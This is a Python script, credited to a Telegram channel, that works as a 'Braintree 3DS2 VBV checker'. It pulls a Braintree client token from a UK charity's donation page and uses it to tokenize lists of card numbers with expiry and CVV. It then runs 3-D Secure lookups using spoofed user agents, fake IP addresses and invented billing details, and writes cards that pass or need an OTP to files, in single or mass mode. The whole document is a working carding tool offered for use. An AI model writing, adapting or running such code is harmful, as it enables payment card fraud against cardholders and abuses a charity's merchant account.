#!/usr/bin/env python3
"""
t.me/npnbit4
"""

import requests, time, json, re, base64, random, string, os, sys
from datetime import datetime
from faker import Faker

CHANNEL = "https://t.me/+2eRp9ldI3S9jZjVl"
DEV = "npnbit4"
fake = Faker()

SITE_URL = "https://cllsupport.org.uk"
DONATE_URL = f"{SITE_URL}/donate/"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"
BRAINTREE_API = "https://api.braintreegateway.com"

STATUS_MAP = {
    "authenticate_successful": "PASSED",
    "authenticate_attempt_successful": "PASSED",
    "challenge_required": "OTP_REQUIRED",
    "authenticate_frictionless_failed": "OTP_REQUIRED",
    "lookup_card_error": "NOT_ENROLLED",
    "authenticate_rejected": "NOT_ENROLLED",
    "lookup_error": "ERROR",
    "authenticate_unavailable": "NOT_ENROLLED",
    "authenticate_error": "ERROR",
    "no_response": "FAILED",
}

stats = {
    'passed': 0, 'otp_required': 0, 'not_enrolled': 0,
    'failed': 0, 'error': 0, 'checked': 0, 'total': 0,
}


# ═══════════════════════════════════════════════
# BIN LOOKUP
# ═══════════════════════════════════════════════
def lookup_bin(bin_num):
    try:
        r = requests.get(
            f"https://lookup.binlist.net/{bin_num}",
            headers={'Accept-Version': '3', 'User-Agent': 'Mozilla/5.0'},
            timeout=5
        )
        data = r.json()

        scheme = data.get('scheme', 'UNKNOWN').upper()
        card_type = data.get('type', 'UNKNOWN').upper()
        bank = data.get('bank', {}).get('name', 'GENERIC').upper()
        country_code = data.get('country', {}).get('alpha2', 'XX').upper()
        prepaid = data.get('prepaid', False)

        return f"{scheme} {card_type} - {bank} ({country_code})" + (" | PREPAID" if prepaid else "")
    except:
        return "UNKNOWN BIN"


def detect_brand(cc):
    if cc.startswith("4"):
        return "VISA"
    if cc.startswith("5"):
        return "MASTERCARD"
    if cc.startswith("3"):
        return "AMEX"
    return "DISCOVER"


# ═══════════════════════════════════════════════
# BRAINTREE AUTH
# ═══════════════════════════════════════════════
def extract_auth(session):
    try:
        r = session.get(DONATE_URL, timeout=20)

        m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text)
        if not m:
            m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)

        if m:
            token_b64 = m.group(1)
            decoded = base64.b64decode(token_b64).decode("utf-8")
            data = json.loads(decoded)
            auth = data.get("authorizationFingerprint", "")
            merch = data.get("merchantId", "")
            if auth and merch:
                return auth, merch

        return None, None
    except:
        return None, None


def tokenize_card(session, auth, cc, mm, yy, cvv):
    if len(yy) == 2:
        yy = "20" + yy

    query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
        tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
    }"""

    variables = {
        "input": {
            "creditCard": {
                "number": cc,
                "expirationMonth": mm,
                "expirationYear": yy,
                "cvv": cvv,
            },
            "options": {"validate": False},
        }
    }

    headers = {
        "User-Agent": fake.user_agent(),
        "Accept": "application/json",
        "Authorization": f"Bearer {auth}",
        "Braintree-Version": "2018-05-10",
        "Content-Type": "application/json",
    }

    body = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(fake.uuid4()),
        },
        "query": query,
        "variables": variables,
        "operationName": "TokenizeCreditCard",
    }

    resp = session.post(BRAINTREE_GRAPHQL, headers=headers, json=body, timeout=30)
    data = resp.json()

    if "errors" in data:
        err_msg = data["errors"][0].get("message", "Unknown")
        return None, None, None, err_msg

    token = data["data"]["tokenizeCreditCard"]["token"]
    card_info = data["data"]["tokenizeCreditCard"]["creditCard"]

    return token, card_info.get("last4", ""), card_info.get("brandCode", "VISA"), None


def lookup_3ds(session, auth, merch, token, cc):
    url = f"{BRAINTREE_API}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"

    payload = {
        "amount": "1.00",
        "browserColorDepth": 24,
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-GB",
        "browserScreenHeight": 800,
        "browserScreenWidth": 360,
        "browserTimeZone": -345,
        "deviceChannel": "Browser",
        "additionalInfo": {
            "ipAddress": fake.ipv4(),
            "billingLine1": "New York",
            "billingCity": "New York",
            "billingState": "NY",
            "billingPostalCode": "10080",
            "billingCountryCode": "US",
            "billingPhoneNumber": "998773772",
            "billingGivenName": "John",
            "billingSurname": "Doe",
            "email": f"john{random.randint(100, 999)}@gmail.com",
        },
        "bin": cc[:6],
        "dfReferenceId": f"0_{fake.uuid4()}",
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.115.1",
            "cardinalDeviceDataCollectionTimeElapsed": random.randint(400, 2000),
            "issuerDeviceDataCollectionTimeElapsed": random.randint(800, 5000),
            "issuerDeviceDataCollectionResult": True,
        },
        "authorizationFingerprint": auth,
        "braintreeLibraryVersion": "braintree/web/3.115.1",
        "_meta": {
            "merchantAppId": "cllsupport.org.uk",
            "platform": "web",
            "sdkVersion": "3.115.1",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": str(fake.uuid4()),
        },
    }

    resp = session.post(
        url,
        headers={
            "User-Agent": fake.user_agent(),
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        json=payload,
        timeout=45,
    )

    if resp.status_code in [200, 201] and resp.text.strip():
        return resp.json()
    return {}


def parse_status(lookup):
    try:
        return lookup["paymentMethod"]["threeDSecureInfo"]["status"]
    except:
        lookup_str = json.dumps(lookup)
        for code in STATUS_MAP:
            if code in lookup_str:
                return code
    return "no_response"


def get_enrolled(lookup, result_code):
    try:
        enrolled_raw = lookup["paymentMethod"]["threeDSecureInfo"]["enrolled"]
        if enrolled_raw == "Y":
            return "ENROLLED"
        if enrolled_raw == "N":
            return "NOT_ENROLLED"
        if enrolled_raw == "U":
            return "UNKNOWN"
    except:
        pass

    enrolled_map = {
        "authenticate_successful": "ENROLLED",
        "authenticate_attempt_successful": "ENROLLED",
        "challenge_required": "ENROLLED",
        "authenticate_frictionless_failed": "ENROLLED",
        "lookup_card_error": "NOT_ENROLLED",
        "authenticate_rejected": "NOT_ENROLLED",
        "lookup_error": "NOT_ENROLLED",
        "authenticate_unavailable": "NOT_ENROLLED",
        "authenticate_error": "NOT_ENROLLED",
        "no_response": "UNKNOWN",
    }
    return enrolled_map.get(result_code, "UNKNOWN")


def check_card(session, auth, merch, card_input, show_bin=False):
    parts = card_input.strip().replace('/', '|').split('|')
    if len(parts) < 4:
        return {
            'status': 'ERROR',
            'message': 'INVALID_FORMAT',
            'brand': 'UNKNOWN',
            'last4': '0000',
            'bin_info': None,
            'time': 0,
        }

    cc = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    cvv = parts[3].strip()

    t0 = time.time()
    bin_info = lookup_bin(cc[:6]) if show_bin else None

    token, last4, brand, err = tokenize_card(session, auth, cc, mm, yy, cvv)

    if not token:
        return {
            'status': 'FAILED',
            'message': err or 'TOKEN_FAILED',
            'brand': detect_brand(cc),
            'last4': cc[-4:],
            'bin_info': bin_info,
            'time': time.time() - t0,
        }

    lookup = lookup_3ds(session, auth, merch, token, cc)
    result_code = parse_status(lookup)
    status = STATUS_MAP.get(result_code, "UNKNOWN")
    enrolled = get_enrolled(lookup, result_code)

    return {
        'status': status,
        'message': result_code,
        'brand': brand,
        'last4': last4,
        'enrolled': enrolled,
        'bin_info': bin_info,
        'time': time.time() - t0,
    }


def display_result(result, card):
    icon = {
        'PASSED': '✅',
        'OTP_REQUIRED': '🔐',
        'NOT_ENROLLED': '⚠️',
        'FAILED': '❌',
        'ERROR': '❌',
    }.get(result['status'], '❓')

    print(f"  {icon} [{result['status']}]")
    print(f"  Enrolled: {result.get('enrolled', 'N/A')}")
    print(f"  Brand: {result.get('brand', 'N/A')} | Last4: {result.get('last4', 'N/A')}")
    print(f"  Code: {result.get('message', 'N/A')}")

    if result.get('bin_info'):
        print(f"  BIN: {result['bin_info']}")

    print(f"  Time: {result.get('time', 0):.1f}s")

    return icon


def save_result(card, result):
    if result['status'] == 'PASSED':
        with open('passed.txt', 'a') as f:
            f.write(f"{card} | PASSED | {result.get('enrolled', '')}\n")
    elif result['status'] == 'OTP_REQUIRED':
        with open('otp_required.txt', 'a') as f:
            f.write(f"{card} | OTP_REQUIRED | {result.get('enrolled', '')}\n")


def main():
    print(f"""
╔══════════════════════════════════════════════════╗
║  Braintree 3DS2 VBV Checker               ║                         ║
║  Dev: @{DEV}                                     ║
╚══════════════════════════════════════════════════╝
""")

    # Extract auth
    print("[*] Extracting auth...\n")
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-GB,en;q=0.9",
    })

    auth, merch = extract_auth(session)
    if not auth:
        print("❌ Auth failed")
        return

    print(f"✅ Auth: {auth[:40]}...")
    print(f"✅ Merchant: {merch}")
    print(f"{'─'*50}\n")

    mode = input("[?] Mode (1=Single 2=Mass): ").strip()

    if mode == '1':
        while True:
            try:
                card = input("\n[?] Card (cc|mm|yy|cvv): ").strip()
                if not card:
                    continue

                print(f"\n{'─'*50}")
                print(f"  {card}")
                print(f"{'─'*50}\n")

                result = check_card(session, auth, merch, card, show_bin=True)
                display_result(result, card)
                save_result(card, result)

                print(f"\n  📢 {CHANNEL}")
                time.sleep(2)

            except KeyboardInterrupt:
                print("\n[!] Exit")
                break

    elif mode == '2':
        card_file = input("[?] Cards file: ").strip()
        if not os.path.exists(card_file):
            print("[!] Not found")
            return

        with open(card_file) as f:
            cards = [l.strip() for l in f if '|' in l]

        stats['total'] = len(cards)
        print(f"[+] Loaded {len(cards)} cards")
        print(f"{'─'*50}\n")

        for i, card in enumerate(cards, 1):
            print(f"[{i}/{len(cards)}] {card}")

            result = check_card(session, auth, merch, card, show_bin=True)
            display_result(result, card)
            save_result(card, result)

            print(f"  {'─'*45}\n")

            stats['checked'] += 1
            key = result['status'].lower()
            stats[key] = stats.get(key, 0) + 1

            time.sleep(random.uniform(0.5, 1.5))

        print(f"\n{'═'*50}")
        print(f"  RESULTS")
        print(f"{'═'*50}")
        print(f"  ✅ PASSED: {stats.get('passed', 0)}")
        print(f"  🔐 OTP REQUIRED: {stats.get('otp_required', 0)}")
        print(f"  ⚠️ NOT ENROLLED: {stats.get('not_enrolled', 0)}")
        print(f"  ❌ FAILED: {stats.get('failed', 0)}")
        print(f"  ❌ ERRORS: {stats.get('error', 0)}")
        print(f"  📊 TOTAL: {stats['checked']}")
        print(f"{'═'*50}")
        print(f"\n  📢 {CHANNEL}")
        print(f"  By: @{DEV}")


if __name__ == '__main__':
    main()